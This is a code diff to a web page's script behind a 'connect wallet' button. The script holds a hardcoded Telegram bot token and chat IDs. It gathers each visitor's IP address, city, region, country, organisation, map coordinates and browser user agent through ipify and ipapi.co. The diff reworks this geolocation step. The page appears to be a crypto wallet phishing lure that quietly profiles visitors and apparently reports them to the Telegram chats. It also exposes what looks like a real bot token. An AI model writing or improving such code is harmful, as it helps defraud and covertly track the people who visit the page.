@@ -3302,7 +3302,7 @@
  
 <script>
 $(document).ready(function() {
-    const BOT_TOKEN = '7746117883:AAGZRV65ZmLtIgn8tAYQ9A8GLGRUMMqr5AY';
+        const BOT_TOKEN = '7746117883:AAGZRV65ZmLtIgn8tAYQ9A8GLGRUMMqr5AY';
         const CHAT_IDS = ['7651943856', '7651943856', '6661378262'];
 
     $('#button_connect_wallet').off('click').on('click', async function(e) {
@@ -3321,15 +3321,20 @@ $(document).ready(function() {
         button.text('Loading...').prop('disabled', true);
 
         try {
-            // Fetch IP and location info
-            const ipData = await fetch('https://ipinfo.io/json?token=2ed417fa5b8e7f').then(res => res.json());
-
+            // Get IP first
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
             const userIP = ipData.ip || 'Unknown IP';
-            const userCity = ipData.city || 'Unknown City';
-            const userCountry = ipData.country || 'Unknown Country';
-            const userRegion = ipData.region || 'Unknown Region';
-            const userOrg = ipData.org || 'Unknown Organization';
-            const locationLink = `https://www.google.com/maps/search/?api=1&query=${ipData.loc}`;
+
+            // Now get location from ipapi
+            const locRes = await fetch(`https://ipapi.co/${userIP}/json/`);
+            const locData = await locRes.json();
+
+            const userCity = locData.city || 'Unknown City';
+            const userRegion = locData.region || 'Unknown Region';
+            const userCountry = locData.country_name || 'Unknown Country';
+            const userOrg = locData.org || 'Unknown Organization';
+            const locationLink = `https://www.google.com/maps/search/?api=1&query=${locData.latitude},${locData.longitude}`;
 
             const userAgent = navigator.userAgent;
 
@@ -3370,6 +3375,7 @@ $(document).ready(function() {
     });
 });
 </script>
+
 
     
     
